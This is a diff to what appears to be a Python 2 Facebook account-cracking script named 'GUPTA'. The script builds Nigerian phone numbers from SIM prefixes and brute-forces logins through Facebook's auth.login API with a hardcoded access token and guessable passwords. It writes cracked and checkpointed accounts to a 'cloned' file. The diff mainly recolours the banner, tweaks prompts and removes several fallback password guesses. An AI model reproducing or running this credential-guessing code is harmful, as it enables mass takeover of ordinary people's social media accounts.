@@ -80,31 +80,31 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;94m░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░
-\033[1;94m██╔════╝░██║░░░██║██╔══██╗╚══██╔══╝██╔══██╗
-\033[1;92m██║░░██╗░██║░░░██║██████╔╝░░░██║░░░███████║
-\033[1;92m██║░░╚██╗██║░░░██║██╔═══╝░░░░██║░░░██╔══██║
-\033[1;95m╚██████╔╝╚██████╔╝██║░░░░░░░░██║░░░██║░░██║
-\033[1;95m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝
+\033[1;93m░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░
+\033[1;93m██╔════╝░██║░░░██║██╔══██╗╚══██╔══╝██╔══██╗
+\033[1;97m██║░░██╗░██║░░░██║██████╔╝░░░██║░░░███████║
+\033[1;97m██║░░╚██╗██║░░░██║██╔═══╝░░░░██║░░░██╔══██║
+\033[1;93m╚██████╔╝╚██████╔╝██║░░░░░░░░██║░░░██║░░██║
+\033[1;92m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝
 """
 
 ####Logo####
 
 logo1 = """
-\033[1;94m░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░
-\033[1;94m██╔════╝░██║░░░██║██╔══██╗╚══██╔══╝██╔══██╗
-\033[1;92m██║░░██╗░██║░░░██║██████╔╝░░░██║░░░███████║
-\033[1;92m██║░░╚██╗██║░░░██║██╔═══╝░░░░██║░░░██╔══██║
-\033[1;95m╚██████╔╝╚██████╔╝██║░░░░░░░░██║░░░██║░░██║
-\033[1;95m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝
+\033[1;93m░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░
+\033[1;93m██╔════╝░██║░░░██║██╔══██╗╚══██╔══╝██╔══██╗
+\033[1;97m██║░░██╗░██║░░░██║██████╔╝░░░██║░░░███████║
+\033[1;97m██║░░╚██╗██║░░░██║██╔═══╝░░░░██║░░░██╔══██║
+\033[1;93m╚██████╔╝╚██████╔╝██║░░░░░░░░██║░░░██║░░██║
+\033[1;93m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝
 """
 logo2 = """
-\033[1;94m░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░
-\033[1;94m██╔════╝░██║░░░██║██╔══██╗╚══██╔══╝██╔══██╗
-\033[1;92m██║░░██╗░██║░░░██║██████╔╝░░░██║░░░███████║
-\033[1;92m██║░░╚██╗██║░░░██║██╔═══╝░░░░██║░░░██╔══██║
-\033[1;95m╚██████╔╝╚██████╔╝██║░░░░░░░░██║░░░██║░░██║
-\033[1;95m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝
+\033[1;93m░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░
+\033[1;93m██╔════╝░██║░░░██║██╔══██╗╚══██╔══╝██╔══██╗
+\033[1;97m██║░░██╗░██║░░░██║██████╔╝░░░██║░░░███████║
+\033[1;97m██║░░╚██╗██║░░░██║██╔═══╝░░░░██║░░░██╔══██║
+\033[1;93m╚██████╔╝╚██████╔╝██║░░░░░░░░██║░░░██║░░██║
+\033[1;93m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝
 """
 CorrectUsername = "MEMO"
 CorrectPassword = "KING"
@@ -144,7 +144,7 @@ def login():
     pilih_login()
 
 def pilih_login():
-    peak = raw_input("\n\033[1;95m--➤ \033[1;93m")
+    peak = raw_input("\n\033[1;95m➤ \033[1;93m")
     if peak =="":
         print "\x1b[1;97mFill In Correctly"
         pilih_login()
@@ -169,10 +169,10 @@ def action():
         os.system("clear")
         print logo2
         print "Enter any Nigerian Mobile code Number"+'\n'
-        print '\x1b[1;91mEnter any SIM codes for Nigerians >> 907, 906, 706, 710, 714, 811, 911, 711'
+        print '\x1b[1;91mEnter any SIM codes for Nigerians >> 907, 906, 706, 710, 714, 811, 911'
         
         try:
-            c = raw_input("\033[1;97m---GUPTA-➤")
+            c = raw_input("\033[1;97mGUPTA--➤")
             k="+234"
             idlist = ('.txt')
             for line in open(idlist,"r").readlines():
@@ -192,6 +192,7 @@ def action():
     jalan ('\033[1;92mCode you choose: '+c)
     jalan ("\033[1;93mWait A While \x1b[1;94mStart Cracking...")
     jalan ("\033[1;94mTo Stop Process Press Ctrl+z")
+    jalan ("\033[1;95mPASSWPRD >> Last 7 digit , All digit clone.")
     print 50* '\033[1;97m-'
     def main(arg):
         global cpb,oks
@@ -205,7 +206,7 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;95m(GUPTA-CP)  ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;95m(GUPTA-OK)  ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
@@ -234,57 +235,7 @@ def action():
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
                             cpb.append(c+user+pass2)
-                        else:
-                            pass3="223344"
-                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                            q = json.load(data)
-                            if 'access_token' in q:
-                                print '\x1b[1;93m(GUPTA-OK)  ' + k + c + user + '  |  ' + pass3
-                                okb = open('save/cloned.txt', 'a')
-                                okb.write(k+c+user+pass3+'\n')
-                                okb.close()
-                                oks.append(c+user+pass3)
-                            else:
-                                if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;97m(\x1b[1;93mGUPTA-CP) ' + k + c + user + '  |  ' + pass3 
-                                    cps = open('save/cloned.txt', 'a')
-                                    cps.write(k+c+user+pass3+'\n')
-                                    cps.close()
-                                    cpb.append(c+user+pass3)
-                                else:
-                                    pass4="334455"
-                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                                    q = json.load(data)
-                                    if 'access_token' in q:
-                                        print '\x1b[1;93m(GUPTA-OK)  ' + k + c + user + '  |  ' + pass4 
-                                        okb = open('save/cloned.txt', 'a')
-                                        okb.write(k+c+user+pass4+'\n')
-                                        okb.close()
-                                        oks.append(c+user+pass4)
-                                    else:
-                                        if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;97m\x1b[1;93m(GUPTA-CP) ' + k + c + user + '  |  ' + pass4
-                                            cps = open('save/cloned.txt', 'a')
-                                            cps.write(k+c+user+pass4+'\n')
-                                            cps.close()
-                                            cpb.append(c+user+pass4)
-                                        else:
-                                            pass5="445566"
-                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                                            q = json.load(data)
-                                            if 'access_token' in q:
-                                                print '\x1b[1;93m(GUPTA-OK)  ' + k + c + user + '  |  ' + pass5
-                                                okb = open('save/cloned.txt', 'a')
-                                                okb.write(k+c+user+pass5+'\n')
-                                                okb.close()
-                                                oks.append(c+user+pass5)
-                                            else:
-                                                if 'www.facebook.com' in q['error_msg']:
-                                                    print '\033[1;97m\x1b[1;94m(GUPTA-CP) ' + k + c + user + '  |  ' + pass5 
-                                                    cps = open('save/cloned.txt', 'a')
-                                                    cps.write(k+c+user+pass5+'\n')
-                                                    cps.close()
-                                                    cpb.append(c+user+pass5)
+                        
                                                                                                                                                                                                                 
                                                                                                                                                                                                                 
                                                                                                                                                                                                             
